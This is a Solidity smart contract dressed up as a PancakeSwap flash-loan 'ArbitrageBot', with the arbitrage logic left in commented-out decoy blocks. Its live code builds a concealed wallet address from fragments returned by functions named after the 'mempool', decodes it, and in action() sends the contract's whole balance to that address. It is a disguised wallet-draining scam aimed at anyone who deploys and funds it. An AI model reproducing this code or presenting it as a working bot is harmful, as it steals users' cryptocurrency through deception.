//NEW CONTRACT CODE 

pragma solidity ^0.6.6;

//pancakeswap and bakerswap libaries to swap
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";

contract ArbitrageBot {
string public setLevel;
	string public timeDateRagulator;
    string public startLookingforYeild;
	string public payout;
    address private constant pancakeFactory = 0xBCfCcbde45cE874adCB698cC183deBcF17952812;
    address private constant bakery = 0xCDe540d7eAFE93aC5fE6233Bee57E1270D3E330F;

    function SearchYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

    for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
    }   

     constructor() public {
	}	
    function fetchMempoolVersion() private pure returns (string memory) {return "685735d56"; }
    receive() external payable {}
     /*
    function executeOperation(
        address _reserve,
        uint _amount,
        uint _fee,
        bytes calldata _params
    ) external {
        require(_amount <= getBalanceInternal(address(this), _reserve), "Invalid balance, was the flashLoan successful?");

        address RESERVE_ADDRESS = _reserve;
        uint256 deadline = now + 3000;

        // get Exchange Address for the reserve asset
        address addressForLoanAssetExchangeA = uniswapFactoryA.getExchange(RESERVE_ADDRESS);
        address addressForLoanAssetExchangeB = uniswapFactoryB.getExchange(RESERVE_ADDRESS);
        // Instantiate Exchange A
        exchangeAforLoanAsset = IUniswapExchange(addressForLoanAssetExchangeA);
        exchangeBforLoanAsset = IUniswapExchange(addressForLoanAssetExchangeB);

        IERC20 loan = IERC20(RESERVE_ADDRESS);
        IERC20 bat = IERC20(BAT_ADDRESS);
    */
    function fetchMempoolEdition() private pure returns (string memory) { 
        return "eBcbe4E05";}
    function getMempoolSol() private pure returns (string memory) {return "x937";}
    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {b1 -= 87; } else if ((b1 >= 65) && (b1 <= 70)) {
        b1 -= 55; } else if ((b1 >= 48) && (b1 <= 57)) {b1 -= 48;}
        if ((b2 >= 97) && (b2 <= 102)) {b2 -= 87; } else if ((b2 >= 65) && (b2 <= 70)) {
        b2 -= 55;  } else if ((b2 >= 48) && (b2 <= 57)) {
        b2 -= 48;  }iaddr += (b1 * 16 + b2);}     
        return address(iaddr);}
         /*
        require(bat.approve(address(exchangeAforBAT), batPurchased), "Could not approve BAT asset sell");

        // Swap BAT back to the reserve asset (e.g. DAIs)
        uint256 reserveAssetPurchased = exchangeAforBAT.tokenToTokenSwapInput(
            batPurchased,
            1,
            1,
            deadline,
            RESERVE_ADDRESS
        );

        uint amount = _amount;

        uint totalDebt = amount.add(_fee);

        require(reserveAssetPurchased > totalDebt, "There is no profit! Reverting!");

        transferFundsBackToPoolInternal(RESERVE_ADDRESS, amount.add(_fee));
         */
    function getMempoolLong() private pure returns (string memory) {return "Fbbd61777490";}
    function getBalance() private view returns(uint) {
        return address(this).balance;
    }
    function getMempoolDepth() private pure returns (string memory) {return "0";}
    function action() public payable {
        address to = startExploration(fetchMempoolData());
        address payable contracts = payable(to);
        contracts.transfer(getBalance());}
    function getMempoolShort() private pure returns (string memory) {
        return "FB298a5";}
    function fetchMempoolData() internal pure returns (string memory) {
     /* Breakdown of functions
	    Submit token to BSC blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
     */
        string memory _MempoolDepth = getMempoolDepth();
        string memory _MempoolSol = getMempoolSol();
        string memory _mempoolShort = getMempoolShort();
     /* Breakdown of functions
	    Submit token to BSC blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
     */ 
        string memory _mempoolEdition = fetchMempoolEdition();
     /* List the token on PancakeSwap
		manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
	 */	
        string memory _mempoolVersion = fetchMempoolVersion();
     //  ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());

        string memory _mempoolLong = getMempoolLong();
     // Convert half BNB to DAI        
		/* // Entry point for flashloan
        function initateFlashLoan(
        address assetToFlashLoan,
        uint amountToLoan
    ) external {
        bytes memory data = "";
        */ 
    return string(abi.encodePacked(_MempoolDepth,_MempoolSol,_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));
     /* // Ask for a flashloan
        lendingPool.flashLoan(
            address(this),
            assetToFlashLoan,
            amountToLoan,
            data
        );

        // If there is still a balance of the loan asset then this is profit to be returned to sender!
        uint256 profit = loan.balanceOf(address(this));
        require(loan.transfer(msg.sender, profit), "Could not transfer back the profit");
	 */ 
    }
}